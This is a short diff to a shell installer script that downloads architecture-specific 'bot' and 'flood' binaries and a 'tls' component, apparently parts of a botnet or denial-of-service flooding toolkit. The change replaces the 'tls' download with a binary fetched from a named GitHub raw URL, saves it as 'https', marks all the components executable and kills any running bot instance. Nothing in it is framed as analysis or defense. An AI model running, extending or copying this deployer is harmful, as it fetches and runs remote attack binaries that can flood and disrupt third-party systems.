@@ -52,10 +52,10 @@ download_file() {
 echo "[*] Downloading components..."
 download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "bot" || download_file "${REPO_BASE}/bots/bot" "bot"
 download_file "${REPO_BASE}/bots/flood-${BIN_ARCH}" "flood" || download_file "${REPO_BASE}/bots/flood" "flood"
-download_file "${REPO_BASE}/bots/tls/tls-${BIN_ARCH}" "tls" || download_file "${REPO_BASE}/bots/tls/tls" "tls" || true
+download_file "https://github.com/mejisuyao-jpg/assets/raw/refs/heads/main/asu/tls" "https" || true
 download_file "${REPO_BASE}/agent.txt" "agent.txt" || true
 
-chmod +x bot flood tls 2>/dev/null || true
+chmod +x bot flood tls https 2>/dev/null || true
 
 # Kill old bot instance if running
 pkill -f "./bot" 2>/dev/null || true
